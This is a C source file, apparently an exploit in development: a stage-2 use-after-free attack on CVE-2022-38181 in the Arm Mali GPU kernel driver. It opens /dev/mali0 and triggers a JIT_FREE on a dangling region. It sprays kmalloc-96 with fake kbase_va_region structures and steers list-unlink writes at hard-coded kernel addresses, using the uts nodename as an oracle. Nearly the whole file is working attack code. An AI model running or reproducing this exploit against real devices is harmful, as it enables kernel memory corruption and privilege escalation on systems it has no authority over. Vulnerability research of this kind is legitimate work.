/* CVE-2022-38181 stage-2: reclaim freed kbase_va_region (kmalloc-96) with
 * controlled fake -> kbase_jit_free unlink writes -> uts nodename oracle.
 *
 * modes:
 *   step <mb>          lifecycle probe: alloc id=1, DONT_NEED, pressure, MEM_QUERY, NO free
 *   uaf <mb>           same + JIT_FREE (bare dangling deref, expect crash)
 *   spray <mb> <n>     same + xattr burst (fake region) + JIT_FREE + uname oracle
 *   keys               SELinux probe: add_key allowed?
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <pthread.h>

#define KBASE_IOCTL_TYPE 0x80
#define BASE_UK_VERSION_MAJOR 11
#define BASE_UK_VERSION_MINOR 11
#define MEM_PROT (0xFUL)
#define BASE_MEM_DONT_NEED ((uint64_t)1 << 17)
#define BASE_JD_REQ_SOFT_JOB ((uint32_t)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)
#define BASE_JD_REQ_SOFT_JIT_FREE (BASE_JD_REQ_SOFT_JOB | 0xa)

struct version_check { uint16_t major; uint16_t minor; };
struct set_flags_s { uint32_t create_flags; };
struct job_submit_s { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
union mem_alloc_u {
	struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
	struct { uint64_t flags; uint64_t gpu_addr; } out;
};
union mem_query_u {
	struct { uint64_t gpu_addr; uint64_t query; } in;
	struct { uint64_t value; } out;
};
struct mem_jit_init_s { uint64_t va_pages; uint8_t max_allocations; uint8_t trim_level; uint8_t padding[6]; };
struct mem_flags_change_s { uint64_t gpu_va; uint64_t flags; uint64_t mask; };
struct atom_v2 {
	uint64_t jc;
	uint64_t udata[2];
	uint64_t extres_list;
	uint16_t nr_extres;
	uint16_t compat_core_req;
	uint8_t pre_dep[4];
	uint8_t atom_number;
	uint8_t prio;
	uint8_t device_nr;
	uint8_t pad1;
	uint32_t core_req;
};
struct jit_alloc_info {
	uint64_t gpu_alloc_addr;
	uint64_t va_pages;
	uint64_t commit_pages;
	uint64_t extent;
	uint8_t id;
	uint8_t bin_id;
	uint8_t max_allocations;
	uint8_t flags;
	uint8_t padding[2];
	uint16_t usage_id;
};

_Static_assert(sizeof(union mem_alloc_u) == 32, "ma");
_Static_assert(sizeof(union mem_query_u) == 16, "mq");
_Static_assert(sizeof(struct atom_v2) == 48, "atom");
_Static_assert(sizeof(struct jit_alloc_info) == 40, "info");

#define IOC(d, t, n, s) ((d) << 30 | (s) << 16 | (t) << 8 | (n))
#define IOCTL_VERSION_CHECK IOC(3, KBASE_IOCTL_TYPE, 0, 4)
#define IOCTL_SET_FLAGS IOC(1, KBASE_IOCTL_TYPE, 1, 4)
#define IOCTL_JOB_SUBMIT IOC(1, KBASE_IOCTL_TYPE, 2, 16)
#define IOCTL_MEM_ALLOC IOC(3, KBASE_IOCTL_TYPE, 5, 32)
#define IOCTL_MEM_QUERY IOC(3, KBASE_IOCTL_TYPE, 6, 16)
#define IOCTL_MEM_JIT_INIT IOC(1, KBASE_IOCTL_TYPE, 14, 16)
#define IOCTL_MEM_FLAGS_CHANGE IOC(1, KBASE_IOCTL_TYPE, 23, 24)

/* exact-build statics (vmlinux 4.9.117-g08fe75b) */
#define S_FAKE_GPU_ALLOC 0xc118b7ecu  /* xfrm data: nents@+8=0, evict_node@+0x18 self, kctx@+0x38=S+0x34 */
#define UTS_NODENAME     0xc110d561u  /* init_uts_ns.name.nodename ("(none)") */
#define SCRATCH_P        0xc118bd58u  /* xfrm zero word, target of unlink write #2 */

#define LOG(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while (0)

static int fd;

static int submit_atom(struct atom_v2 *a)
{
	struct job_submit_s js = { (uint64_t)(uintptr_t)a, 1, sizeof(*a) };
	return ioctl(fd, IOCTL_JOB_SUBMIT, &js);
}

static int mem_alloc_region(int pages_va, int pages_commit, uint64_t *out_va)
{
	union mem_alloc_u ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = pages_va;
	ma.in.commit_pages = pages_commit;
	ma.in.flags = MEM_PROT;
	if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0)
		return -1;
	*out_va = ma.out.gpu_addr;
	return 0;
}

static long query_commit(uint64_t gpu_va)
{
	union mem_query_u q;
	memset(&q, 0, sizeof(q));
	q.in.gpu_addr = gpu_va;
	q.in.query = 1; /* COMMIT_SIZE */
	if (ioctl(fd, IOCTL_MEM_QUERY, &q) != 0)
		return -1;
	return (long)q.out.value;
}

static void pressure_fn(int mb)
{
	pid_t p = fork();
	if (p == 0) {
		cpu_set_t set;
		CPU_ZERO(&set);
		CPU_SET(0, &set);
		sched_setaffinity(0, sizeof(set), &set);
		for (int i = 0; i < mb / 16; i++) {
			void *m = mmap(NULL, 16UL << 20, PROT_READ | PROT_WRITE,
					MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
			if (m == MAP_FAILED)
				break;
		}
		_exit(0);
	}
	int st;
	waitpid(p, &st, 0);
}

static void build_fake(uint8_t *buf96)
{
	memset(buf96, 0, 96);
	/* region offsets within the 96-byte slot */
	*(uint64_t *)(buf96 + 0x18) = 0;                 /* start_pfn */
	*(uint32_t *)(buf96 + 0x24) = 0;                 /* initial_commit */
	*(uint32_t *)(buf96 + 0x28) = 0;                 /* flags (gets |= DONT_NEED) */
	*(uint32_t *)(buf96 + 0x30) = 0;                 /* cpu_alloc NULL -> backed size 0 */
	*(uint32_t *)(buf96 + 0x34) = S_FAKE_GPU_ALLOC;  /* gpu_alloc -> static fake phy alloc */
	*(uint32_t *)(buf96 + 0x38) = UTS_NODENAME - 4;  /* jit_node.next N: W1 *(N+4)=P */
	*(uint32_t *)(buf96 + 0x3c) = SCRATCH_P;         /* jit_node.prev P: W2 *(P)=N */
	buf96[0x42] = 1;                                 /* jit_bin_id */
}

#define NSPRAY 32768
static uint64_t spray_va[NSPRAY];
static int spray_n;
static volatile int spray_stop;

static void *spray_thread(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
	while (!spray_stop) {
		uint64_t va;
		/* commit=0: no physical pages -> allocs survive the pressure
		 * storm, sustaining kmalloc-96 volume to reach the freed slot */
		if (mem_alloc_region(0x40, 0, &va) == 0) {
			if (spray_n < NSPRAY)
				spray_va[spray_n] = va;
			spray_n++;
		} else {
			usleep(100);
		}
	}
	return NULL;
}

int main(int argc, char **argv)
{
	if (argc < 2) {
		LOG("usage: %s step|uaf|spray|keys [mb] [n]\n", argv[0]);
		return 1;
	}
	const char *mode = argv[1];
	int pmb = argc > 2 ? atoi(argv[2]) : 700;
	int nfiles = argc > 3 ? atoi(argv[3]) : 512;

	if (!strcmp(mode, "keys")) {
		char payload[84];
		memset(payload, 0x41, sizeof(payload));
		long r = syscall(__NR_add_key, "user", "probe0", payload, sizeof(payload),
				0xffffffff /* KEY_SPEC_PROCESS_KEYRING */);
		LOG("[*] add_key -> %ld (%s)\n", r, r < 0 ? strerror(errno) : "OK");
		return 0;
	}

	LOG("[*] stage2 mode=%s pressure=%dMB\n", mode, pmb);

	fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	if (fd < 0) { LOG("[-] mali0: %s\n", strerror(errno)); return 1; }
	struct version_check vc = { BASE_UK_VERSION_MAJOR, BASE_UK_VERSION_MINOR };
	if (ioctl(fd, IOCTL_VERSION_CHECK, &vc) != 0) { LOG("[-] handshake\n"); return 1; }
	struct set_flags_s sf = { 0 };
	ioctl(fd, IOCTL_SET_FLAGS, &sf);
	void *track = mmap(NULL, 4096, PROT_NONE, MAP_SHARED, fd, 3ull << 12);
	if (track == MAP_FAILED) { LOG("[-] track mmap\n"); return 1; }

	union mem_alloc_u ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = 1;
	ma.in.commit_pages = 1;
	ma.in.flags = MEM_PROT;
	if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0) { LOG("[-] scratch alloc\n"); return 1; }
	uint64_t scratch = ma.out.gpu_addr;
	void *scratch_cpu = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, scratch);
	if (scratch_cpu == MAP_FAILED) { LOG("[-] scratch mmap\n"); return 1; }
	*(volatile uint64_t *)scratch_cpu = 0;

	struct mem_jit_init_s ji;
	memset(&ji, 0, sizeof(ji));
	ji.va_pages = 0x1000;
	ji.max_allocations = 64;
	if (ioctl(fd, IOCTL_MEM_JIT_INIT, &ji) != 0) { LOG("[-] jit init\n"); return 1; }

	struct jit_alloc_info info;
	memset(&info, 0, sizeof(info));
	info.gpu_alloc_addr = scratch;
	info.va_pages = 0x40;
	info.commit_pages = 0x10;
	info.extent = 0x10;
	info.id = 1;
	info.bin_id = 1;
	struct atom_v2 a;
	memset(&a, 0, sizeof(a));
	a.jc = (uint64_t)(uintptr_t)&info;
	a.nr_extres = 1;
	a.atom_number = 1;
	a.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
	if (submit_atom(&a) != 0) { LOG("[-] jit alloc submit\n"); return 1; }
	sleep(1);
	uint64_t jit_va = *(volatile uint64_t *)scratch_cpu;
	LOG("[+] jit id=1 va=0x%llx commit=%ld\n", (unsigned long long)jit_va, query_commit(jit_va));
	if (!jit_va) { LOG("[-] alloc failed\n"); return 1; }

	struct mem_flags_change_s fc = { jit_va, BASE_MEM_DONT_NEED, BASE_MEM_DONT_NEED };
	if (ioctl(fd, IOCTL_MEM_FLAGS_CHANGE, &fc) != 0) { LOG("[-] DONT_NEED: %s\n", strerror(errno)); return 1; }

	int do_spray = !strcmp(mode, "spray") || !strcmp(mode, "spstep") || !strcmp(mode, "spfree");
	int do_free = strcmp(mode, "step") != 0 && strcmp(mode, "spstep") != 0;

	if (do_spray) {
		/* worker (system_wq) may run on any cpu -> cover all 4 with 2
		 * sprayers each; threads stay hot through the whole pressure */
		pthread_t th[8];
		int nt = 0;
		spray_stop = 0;
		for (int i = 0; i < 8; i++)
			pthread_create(&th[nt++], NULL, spray_thread, (void *)(intptr_t)(i % 4));
		LOG("[+] marked evictable, starting spray(%d threads) + pressure...\n", nt);
		pressure_fn(pmb);
		spray_stop = 1;
		for (int i = 0; i < nt; i++)
			pthread_join(th[i], NULL);
		LOG("[+] sprayed %d regions during pressure\n", spray_n);
		/* final retention batch from cpu0: take + hold current heads */
		cpu_set_t set;
		CPU_ZERO(&set);
		CPU_SET(0, &set);
		sched_setaffinity(0, sizeof(set), &set);
		for (int i = 0; i < 16; i++) {
			uint64_t va;
			if (mem_alloc_region(0x40, 0, &va) == 0 && spray_n < NSPRAY)
				spray_va[spray_n++] = va;
		}
	} else {
		LOG("[+] marked evictable, applying pressure...\n");
		pressure_fn(pmb);
	}

	long q1 = query_commit(jit_va);
	LOG("[+] post-pressure query(jit_va)=%ld\n", q1);
	/* NOTE: query>=0 here is inconclusive: spray regions reuse the freed
	 * region's VA in the custom zone; the original was likely destroyed */

	if (!do_free) {
		sleep(5);
		LOG("[+] NO-FREE SURVIVED (%s, sprayed %d)\n", mode, spray_n);
		return 0;
	}

	if (do_spray) {
		LOG("[*] %d regions sprayed; dangling slot hopefully a region now\n", spray_n);
	}

	LOG("[*] submitting JIT_FREE id=1 (dangling deref)\n");
	uint8_t ids[2] = { 1, 0 };
	struct atom_v2 f;
	memset(&f, 0, sizeof(f));
	f.jc = (uint64_t)(uintptr_t)ids;
	f.nr_extres = 1;
	f.atom_number = 20;
	f.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
	if (submit_atom(&f) != 0)
		LOG("[-] free submit: %s\n", strerror(errno));
	sleep(1);

	if (!strcmp(mode, "spfree")) {
		LOG("[+] SPFREE SURVIVED: kbase_jit_free completed on reclaimed slot\n");
		return 0;
	}

	if (!strcmp(mode, "spray")) {
		/* oracle: JIT_ALLOC(size 0x40, bin 0) reuses pool members; the
		 * only region on jit_pool_head is the hijacked victim */
		struct jit_alloc_info o;
		memset(&o, 0, sizeof(o));
		o.gpu_alloc_addr = scratch;
		o.va_pages = 0x40;
		o.commit_pages = 0x10;
		o.extent = 0x10;
		o.id = 2;
		o.bin_id = 0;
		struct atom_v2 oa;
		memset(&oa, 0, sizeof(oa));
		oa.jc = (uint64_t)(uintptr_t)&o;
		oa.nr_extres = 1;
		oa.atom_number = 30;
		oa.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
		if (submit_atom(&oa) != 0) { LOG("[-] oracle submit: %s\n", strerror(errno)); return 1; }
		sleep(1);
		uint64_t got = *(volatile uint64_t *)scratch_cpu;
		LOG("[+] oracle jit alloc id=2 va=0x%llx\n", (unsigned long long)got);
		int hit = -1;
		for (int i = 0; i < spray_n; i++)
			if (spray_va[i] == got) { hit = i; break; }
		if (hit >= 0)
			LOG("[+] ORACLE HIT: jit_alloc returned sprayed region #%d -> UAF REDIRECT PROVEN\n", hit);
		else
			LOG("[*] oracle va not among sprayed (pool walk picked something else)\n");
		LOG("[*] pausing (avoid fd close / kctx teardown); pid %d\n", getpid());
		pause();
	}
	sleep(3);
	LOG("[+] SURVIVED\n");
	return 0;
}
